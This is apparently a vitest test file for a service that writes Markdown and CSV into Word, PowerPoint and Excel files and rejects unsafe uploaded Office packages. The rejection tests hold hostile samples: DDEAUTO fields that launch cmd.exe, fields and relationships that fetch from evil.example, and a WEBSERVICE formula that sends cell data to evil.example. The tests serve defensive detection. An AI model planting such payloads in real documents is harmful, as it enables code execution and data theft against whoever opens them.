import { describe, expect, it } from "vitest";
import { convertToText } from "../src/content/index";
import { writeZip } from "../src/content/zip-write";
import { checkTemplate, encodeContent, featuresLost, presentationStructure } from "../src/office-write";

const now = new Date("2026-10-17T12:00:00Z");

async function text(name: string, bytes: Uint8Array): Promise<string> {
  return (await convertToText({ bytes, name, maxChars: 100_000 }))?.content ?? "";
}

describe("encodeContent", () => {
  it("writes Markdown as a Word document, keeping the Markdown for the approver", async () => {
    const encoded = await encodeContent("Plan.docx", "# Plan\n\n- Ship **it**\n", { now, author: "Ada" });
    expect(encoded.writing).toEqual({ as: "word" });
    expect(encoded.source).toBe("# Plan\n\n- Ship **it**\n");
    expect(await text("Plan.docx", encoded.bytes)).toContain("# Plan");
  });

  it("writes Markdown as a deck, a slide per heading", async () => {
    const encoded = await encodeContent("Deck.pptx", "# One\n\n- a\n\n# Two\n\n- b\n", { now });
    expect(encoded.writing).toEqual({ as: "powerpoint" });
    const { slides, layouts } = await presentationStructure(encoded.bytes);
    expect(slides.map(slide => slide.placeholders.find(placeholder => placeholder.type === "title")?.markdown)).toEqual(["One", "Two"]);
    expect(layouts).toContain("Two Content");
  });

  it("writes CSV and rows as a workbook, showing rows to the approver as CSV", async () => {
    const fromCsv = await encodeContent("Costs.xlsx", "Item,Cost\nRent,1200\n", { now });
    expect(fromCsv.writing).toEqual({ as: "excel" });
    const fromRows = await encodeContent("Costs.xlsx", [{ name: "Q1", rows: [["Item", "Note"], ["Rent", "a, \"b\""]] }], { now });
    expect(fromRows.source).toBe("# Q1\nItem,Note\nRent,\"a, \"\"b\"\"\"");
  });

  it("keeps text formats as UTF-8 and passes bytes through", async () => {
    expect(new TextDecoder().decode((await encodeContent("notes.md", "# Hi")).bytes)).toBe("# Hi");
    const zip = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0]);
    expect((await encodeContent("archive.zip", zip)).bytes).toBe(zip);
    const docx = await encodeContent("Plan.docx", "# Plan\n\n[Site](https://example.com)\n", { now });
    expect((await encodeContent("Copy.docx", docx.bytes)).bytes).toBe(docx.bytes);
  });

  describe("an Office file passed as bytes", () => {
    const rels = (type: string, target: string, external = true) =>
      `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
      `<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}"${external ? ' TargetMode="External"' : ""}/></Relationships>`;
    const W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
    const document = (body: string, prefix = "w") =>
      `<?xml version="1.0"?><${prefix}:document xmlns:${prefix}="${W}"><${prefix}:body><${prefix}:p>${body}</${prefix}:p></${prefix}:body></${prefix}:document>`;
    const sheet = (formula: string) => `<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">` +
      `<sheetData><row r="1"><c r="A1"><f>${formula}</f></c></row></sheetData></worksheet>`;
    /** A package with content types for its parts: `.xml` by default, anything else by override. */
    const pack = (entries: Record<string, string>, overrides: Record<string, string> = {}) => writeZip([
      { name: "[Content_Types].xml", data: `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>` +
        Object.entries(overrides).map(([part, type]) => `<Override PartName="/${part}" ContentType="${type}"/>`).join("") + "</Types>" },
      ...Object.entries(entries).map(([name, data]) => ({ name, data })),
    ]);
    const VBA = "application/vnd.ms-office.vbaProject";

    it("is refused when it has macros, ActiveX, embedded objects or workbook links, found by content type rather than name", async () => {
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(""), "word/vbaProject.bin": "x" }, { "word/vbaProject.bin": VBA }))).rejects.toThrow(/has macros/);
      // Renamed, and declared through the extension default instead of an override.
      await expect(encodeContent("a.docx", await writeZip([
        { name: "[Content_Types].xml", data: `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="dat" ContentType="${VBA}"/></Types>` },
        { name: "word/innocent.dat", data: "x" },
      ]))).rejects.toThrow(/has macros/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/sheet9.xml": "<x/>" }, { "xl/sheet9.xml": "application/vnd.ms-excel.macrosheet+xml" }))).rejects.toThrow(/has macros/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/x.xml": "<x/>" }, { "xl/x.xml": "application/vnd.ms-office.activeX+xml" }))).rejects.toThrow(/ActiveX/);
      await expect(encodeContent("a.pptx", await pack({ "ppt/embeddings/o.bin": "x" }, { "ppt/embeddings/o.bin": "application/vnd.openxmlformats-officedocument.oleObject" }))).rejects.toThrow(/embedded objects/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/x.xml": "<x/>" }, { "xl/x.xml": "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml" }))).rejects.toThrow(/links to other workbooks/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/x.xml": "<x/>" }, { "xl/x.xml": "application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml" }))).rejects.toThrow(/data connections/);
    });

    it("is refused when a relationship reaches such a part, whatever the part is declared as", async () => {
      await expect(encodeContent("a.docx", await pack({ "word/_rels/document.xml.rels": rels("vbaProject", "project.bin", false) }))).rejects.toThrow(/has macros/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/_rels/workbook.xml.rels": rels("externalLink", "x.xml", false) }))).rejects.toThrow(/links to other workbooks/);
    });

    it("is refused when it imports an HTML or RTF chunk, whose fields aren't readable here", async () => {
      const chunk = { "word/_rels/document.xml.rels": rels("aFChunk", "chunk.rtf", false), "word/chunk.rtf": "{\\rtf1{\\field{\\*\\fldinst DDEAUTO cmd \"/k calc\"}}}" };
      await expect(encodeContent("a.docx", await pack(chunk, { "word/chunk.rtf": "application/rtf" }))).rejects.toThrow(/has imported HTML or RTF content/);
    });

    it("is refused when opening it fetches something, but may link to a page", async () => {
      await expect(encodeContent("a.docx", await pack({ "word/_rels/settings.xml.rels": rels("attachedTemplate", "https://evil.example/t.dotm") })))
        .rejects.toThrow(/fetches from elsewhere when opened \(attachedTemplate\)/);
      await expect(encodeContent("a.pptx", await pack({ "ppt/slides/_rels/slide1.xml.rels": rels("image", "https://evil.example/pixel.png") })))
        .rejects.toThrow(/\(image\)/);
      const linked = await pack({ "word/document.xml": document(""), "word/_rels/document.xml.rels": rels("hyperlink", "https://example.com") });
      expect((await encodeContent("a.docx", linked)).bytes).toBe(linked);
    });

    it("is refused for DDE and fields that fetch content, even split across runs", async () => {
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(`<w:fldSimple w:instr=" DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc&quot;"/>`) })))
        .rejects.toThrow(/DDE/);
      const split = `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDE</w:instrText></w:r>` +
        `<w:r><w:instrText>PICTURE "https://evil.example/p.png"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(split) }))).rejects.toThrow(/fetch content/);
      const page = `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> PAGE </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(page) }))).resolves.toBeDefined();
    });

    it("finds a field whatever prefix binds WordprocessingML, however its text is written, and in any part", async () => {
      const dde = `<x:r><x:fldChar x:fldCharType="begin"/></x:r><x:r><x:instrText><![CDATA[ DDEAUTO cmd "/k calc" ]]></x:instrText></x:r>`;
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(dde, "x") }))).rejects.toThrow(/DDE/);
      const glossary = document(`<w:fldSimple w:instr="INCLUDETEXT &quot;\\\\evil\\share\\x.docx&quot;"/>`);
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(""), "word/glossary/document.xml": glossary }))).rejects.toThrow(/fetch content/);
    });

    it("is refused for a formula a written workbook couldn't have, in any sheet and however it is written", async () => {
      await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("WEBSERVICE(&quot;https://evil.example/?&quot;&amp;A2)") })))
        .rejects.toThrow(/formula files uploaded here can't have.*WEBSERVICE/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/other/data.xml": sheet('<![CDATA[WEBSERVICE("https://evil.example/")]]>') }))).rejects.toThrow(/WEBSERVICE/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("MAP(A2:A9,_xleta.WEBSERVICE)") }))).rejects.toThrow(/WEBSERVICE/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("SUM(B1:B9)") }))).resolves.toBeDefined();
    });

    it("needs the package's content types, as Office does", async () => {
      await expect(encodeContent("a.docx", await writeZip([{ name: "word/document.xml", data: document("") }]))).rejects.toThrow(/aren't a readable docx file/);
    });
  });

  it("refuses formats that can run code when opened, as text or as bytes", async () => {
    const zip = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0]);
    for (const name of ["a.docm", "a.dotm", "a.xlsm", "a.xlam", "a.xlsb", "a.pptm", "a.ppsm", "a.ppam"]) {
      await expect(encodeContent(name, zip), name).rejects.toThrow(/can run code when opened/);
    }
    for (const name of ["a.doc", "a.xls", "a.ppt", "a.rtf"]) await expect(encodeContent(name, "text"), name).rejects.toThrow(/can run code when opened/);
    const ole = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0]);
    await expect(encodeContent("report.docx", ole)).rejects.toThrow(/legacy binary Office file, or a password-protected one/);
    await expect(encodeContent("anything.bin", ole)).rejects.toThrow(/legacy binary Office file/);
  });

  it("refuses content that doesn't suit the format, saying what to do instead", async () => {
    await expect(encodeContent("Report.pdf", "# Not a PDF")).rejects.toThrow(/Text can't be written as one of the PDFs/);
    await expect(encodeContent("Old.doc", "text")).rejects.toThrow(/Word 97-2003/);
    await expect(encodeContent("Rows.docx", [["a"]])).rejects.toThrow(/Rows can only be written to an Excel workbook/);
    await expect(encodeContent("Fake.docx", new Uint8Array([1, 2, 3]))).rejects.toThrow(/aren't a docx file.*Markdown/);
    await expect(encodeContent("Bad.xlsx", [["=WEBSERVICE(\"https://example.com\")"]])).rejects.toThrow(/WEBSERVICE/);
    await expect(encodeContent("Sheet.xlsx", "a,b", { template: { name: "t.dotx", bytes: new Uint8Array() } })).rejects.toThrow(/template can only be used/);
  });

  it("refuses files over the upload limit", async () => {
    await expect(encodeContent("big.txt", "x".repeat(26 * 1024 * 1024))).rejects.toThrow(/at most 25 MB/);
  });
});

describe("checkTemplate", () => {
  it("matches Word templates to documents and PowerPoint templates to decks", () => {
    expect(() => checkTemplate("a.docx", "House.dotx")).not.toThrow();
    expect(() => checkTemplate("a.pptx", "Brand.potx")).not.toThrow();
    expect(() => checkTemplate("a.docx", "Brand.potx")).toThrow(/needs a .docx or .dotx template/);
    expect(() => checkTemplate("a.xlsx", "Brand.xltx")).toThrow(/only be used for a Word document/);
  });
});

describe("featuresLost", () => {
  it("names nothing for a file this writer made, and nothing for formats it doesn't know", async () => {
    expect(await featuresLost("Plan.docx", (await encodeContent("Plan.docx", "# Plan\n\nText.\n", { now })).bytes)).toEqual([]);
    expect(await featuresLost("notes.txt", new TextEncoder().encode("hi"))).toEqual([]);
    // An unreadable file loses nothing it can name; the approver still sees the new content.
    expect(await featuresLost("Broken.docx", new Uint8Array([1, 2, 3]))).toEqual([]);
  });

  it("names speaker notes a rewrite of a deck would lose", async () => {
    const deck = await encodeContent("Deck.pptx", "# One\n\n> Notes: say hello\n", { now });
    expect(await featuresLost("Deck.pptx", deck.bytes)).toContain("speaker notes");
  });
});
